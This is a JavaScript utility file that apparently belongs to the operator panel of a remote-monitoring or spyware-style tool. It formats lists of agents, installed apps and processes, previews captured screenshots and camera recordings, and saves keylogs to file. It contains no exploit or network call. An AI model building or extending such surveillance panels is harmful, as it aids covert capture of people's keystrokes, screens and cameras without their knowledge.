// Utility functions for formatting and displaying data

export class DataFormatter {
    /**
     * Format app list for website display
     * @param {Array} apps - Raw app list from agent
     * @returns {Array} Formatted app list
     */
    static formatAppList(apps) {
        if (!Array.isArray(apps)) return [];
        
        return apps.map((app, index) => ({
            id: app.id || index,
            name: app.name || app.app || 'Unknown',
            path: app.path || app.exe || '-',
            version: app.version || '-',
            publisher: app.publisher || '-',
            installDate: app.installDate || app.date || '-',
            size: app.size || '-'
        }));
    }

    /**
     * Format process list for website display
     * @param {Array} processes - Raw process list from agent
     * @returns {Array} Formatted process list
     */
    static formatProcessList(processes) {
        if (!Array.isArray(processes)) return [];
        
        return processes.map((proc, index) => ({
            id: proc.id || proc.pid || index,
            pid: proc.pid || proc.id || '-',
            name: proc.name || proc.process || 'Unknown',
            path: proc.path || proc.exe || '-',
            memory: proc.memory ? `${(proc.memory / 1024 / 1024).toFixed(2)} MB` : '-',
            cpu: proc.cpu ? `${proc.cpu}%` : '-',
            user: proc.user || proc.owner || '-',
            status: proc.status || 'running'
        }));
    }

    /**
     * Format agent/server list for website display
     * @param {Array} agents - Raw agent list
     * @returns {Array} Formatted agent list
     */
    static formatAgentList(agents) {
        if (!Array.isArray(agents)) return [];
        
        return agents.map(agent => ({
            id: agent.id || '-',
            name: agent.name || 'Unknown',
            ip: agent.ip || '-',
            machineId: agent.machineId || '-',
            status: agent.status || 'online',
            lastSeen: agent.lastSeen || new Date().toISOString(),
            tags: agent.tags || []
        }));
    }

    /**
     * Search/filter apps by query
     * @param {Array} apps - App list
     * @param {string} query - Search query
     * @returns {Array} Filtered apps
     */
    static searchApps(apps, query) {
        if (!query || !query.trim()) return apps;
        const q = query.toLowerCase().trim();
        return apps.filter(app => 
            (app.name && app.name.toLowerCase().includes(q)) ||
            (app.path && app.path.toLowerCase().includes(q)) ||
            (app.publisher && app.publisher.toLowerCase().includes(q))
        );
    }

    /**
     * Search/filter processes by query
     * @param {Array} processes - Process list
     * @param {string} query - Search query
     * @returns {Array} Filtered processes
     */
    static searchProcesses(processes, query) {
        if (!query || !query.trim()) return processes;
        const q = query.toLowerCase().trim();
        return processes.filter(proc => 
            (proc.name && proc.name.toLowerCase().includes(q)) ||
            (proc.path && proc.path.toLowerCase().includes(q)) ||
            (proc.pid && String(proc.pid).includes(q)) ||
            (proc.user && proc.user.toLowerCase().includes(q))
        );
    }

    /**
     * Search/filter agents by query
     * @param {Array} agents - Agent list
     * @param {string} query - Search query
     * @returns {Array} Filtered agents
     */
    static searchAgents(agents, query) {
        if (!query || !query.trim()) return agents;
        const q = query.toLowerCase().trim();
        return agents.filter(agent => 
            (agent.name && agent.name.toLowerCase().includes(q)) ||
            (agent.ip && agent.ip.includes(q)) ||
            (agent.machineId && agent.machineId.toLowerCase().includes(q)) ||
            (agent.tags && agent.tags.some(tag => tag.toLowerCase().includes(q)))
        );
    }
}

export class MediaPreview {
    /**
     * Display image preview in modal
     * @param {string} base64Data - Base64 image data
     * @param {string} title - Image title
     */
    static showImagePreview(base64Data, title = 'Screenshot') {
        const modal = document.getElementById('image-modal');
        const img = document.getElementById('modal-img');
        const titleEl = document.getElementById('modal-title');
        
        if (!modal || !img) {
            // Create modal if it doesn't exist
            const newModal = document.createElement('div');
            newModal.id = 'image-modal';
            newModal.className = 'media-modal';
            newModal.innerHTML = `
                <div class="modal-content">
                    <div class="modal-header">
                        <h3 id="modal-title">${title}</h3>
                        <button class="modal-close" onclick="this.closest('.media-modal').classList.add('hidden')">×</button>
                    </div>
                    <div class="modal-body">
                        <img id="modal-img" src="" alt="${title}" style="max-width: 100%; height: auto; border-radius: 8px;">
                    </div>
                    <div class="modal-footer">
                        <button onclick="MediaPreview.downloadImage('${base64Data}', '${title}')">Download</button>
                    </div>
                </div>
            `;
            document.body.appendChild(newModal);
            document.getElementById('modal-img').src = `data:image/jpeg;base64,${base64Data}`;
            newModal.classList.remove('hidden');
            return;
        }
        
        img.src = `data:image/jpeg;base64,${base64Data}`;
        if (titleEl) titleEl.textContent = title;
        modal.classList.remove('hidden');
        modal.style.display = 'flex';
    }

    /**
     * Display video preview in modal
     * @param {string} base64Data - Base64 video data
     * @param {string} title - Video title
     */
    static showVideoPreview(base64Data, title = 'Camera Recording') {
        const modal = document.getElementById('video-modal');
        const video = document.getElementById('modal-video');
        const titleEl = document.getElementById('video-title');
        
        if (!modal) {
            // Create modal if it doesn't exist
            const newModal = document.createElement('div');
            newModal.id = 'video-modal';
            newModal.className = 'media-modal';
            newModal.innerHTML = `
                <div class="modal-content">
                    <div class="modal-header">
                        <h3 id="video-title">${title}</h3>
                        <button class="modal-close" onclick="this.closest('.media-modal').classList.add('hidden')">×</button>
                    </div>
                    <div class="modal-body">
                        <video id="modal-video" controls style="max-width: 100%; height: auto; border-radius: 8px;">
                            <source src="" type="video/mp4">
                        </video>
                    </div>
                    <div class="modal-footer">
                        <button onclick="MediaPreview.downloadVideo('${base64Data}', '${title}')">Download</button>
                    </div>
                </div>
            `;
            document.body.appendChild(newModal);
            const videoEl = document.getElementById('modal-video');
            videoEl.src = `data:video/mp4;base64,${base64Data}`;
            newModal.classList.remove('hidden');
            return;
        }
        
        if (video) {
            video.src = `data:video/mp4;base64,${base64Data}`;
            video.load();
        }
        if (titleEl) titleEl.textContent = title;
        modal.classList.remove('hidden');
        modal.style.display = 'flex';
    }

    /**
     * Download image
     */
    static downloadImage(base64Data, filename = 'screenshot') {
        const link = document.createElement('a');
        link.href = `data:image/jpeg;base64,${base64Data}`;
        link.download = `${filename}_${Date.now()}.jpg`;
        link.click();
    }

    /**
     * Download video
     */
    static downloadVideo(base64Data, filename = 'recording') {
        const link = document.createElement('a');
        link.href = `data:video/mp4;base64,${base64Data}`;
        link.download = `${filename}_${Date.now()}.mp4`;
        link.click();
    }
}

export class KeylogManager {
    /**
     * Save keylog to file and clear display
     * @param {string} keylogData - Keylog text
     * @param {string} filename - Output filename
     */
    static saveKeylogToFile(keylogData, filename = null) {
        if (!keylogData || !keylogData.trim()) {
            console.warn('[KeylogManager] No keylog data to save');
            return;
        }

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const defaultFilename = `keylog_${timestamp}.txt`;
        const finalFilename = filename || defaultFilename;

        // Create blob and download
        const blob = new Blob([keylogData], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = finalFilename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);

        // Clear keylog panel
        const keylogPanel = document.getElementById('keylog-panel');
        if (keylogPanel) {
            keylogPanel.value = '';
        }

        console.log(`[KeylogManager] Keylog saved to ${finalFilename}`);
        return finalFilename;
    }

    /**
     * Clear keylog display
     */
    static clearKeylog() {
        const keylogPanel = document.getElementById('keylog-panel');
        if (keylogPanel) {
            keylogPanel.value = '';
            console.log('[KeylogManager] Keylog display cleared');
        }
    }

    /**
     * Get current keylog content
     * @returns {string} Keylog text
     */
    static getKeylogContent() {
        const keylogPanel = document.getElementById('keylog-panel');
        return keylogPanel ? keylogPanel.value : '';
    }
}

// Make available globally
window.DataFormatter = DataFormatter;
window.MediaPreview = MediaPreview;
window.KeylogManager = KeylogManager;


